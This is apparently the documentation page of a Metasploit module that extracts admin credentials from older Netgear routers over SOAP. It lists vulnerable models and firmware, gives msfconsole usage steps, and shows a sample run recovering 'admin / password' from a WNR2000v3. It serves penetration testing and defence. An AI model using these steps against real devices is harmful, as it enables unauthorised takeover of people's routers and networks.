## Vulnerable Application

The following list is a non-exhaustive list of vulnerable Netgear devices:
1.  R6300v2 - V1.0.3.8
2.  WNDR3300 - V1.0.45
3.  WNDR3700v1 - V1.0.7.98
4.  WNDR3700v1 - V1.0.16.98
5.  WNDR3700v2 - V1.0.1.14
6.  WNDR3700v4 - V1.0.1.42
7.  WNDR3700v4 - V1.0.0.4SH
8.  WNDR3700v4 - V1.0.1.52
9.  WNDR3800 - V1.0.0.48
10. WNDR4300 - V1.0.1.60
11. WNR1000v2 - V1.0.1.1
12. WNR1000v2 - V1.1.2.58
13. WNR2000v3 - v1.1.2.10
14. WNR2200 - V1.0.1.88
15. WNR2500 - V1.0.0.24

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/http/netgear_soap_password_extractor```
  3. Do: ```set rhost <ip>```
  4. Do: ```run```
  5. You should get admin info on the device

## Scenarios

  Example run against wnr2000v3 with firmware 1.1.2.10:

```
msf > use auxiliary/admin/http/netgear_soap_password_extractor 
msf auxiliary(netgear_soap_password_extractor) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf auxiliary(netgear_soap_password_extractor) > run

[*] Trying to access the configuration of the device
[*] Extracting Firmware version...
[+] Model wnr2000v3 found
[+] Firmware version V1.1.2.10 found
[+] Device details downloaded to: /root/.msf4/loot/20160701181449_default_192.168.1.1_netgear_soap_dev_668524.txt
[*] Extracting credentials...
[*] Credentials found, extracting...
[+] admin / password credentials found
[+] Account details downloaded to: /root/.msf4/loot/20160701181449_default_192.168.1.1_netgear_soap_acc_252579.txt
[*] Auxiliary module execution completed

```
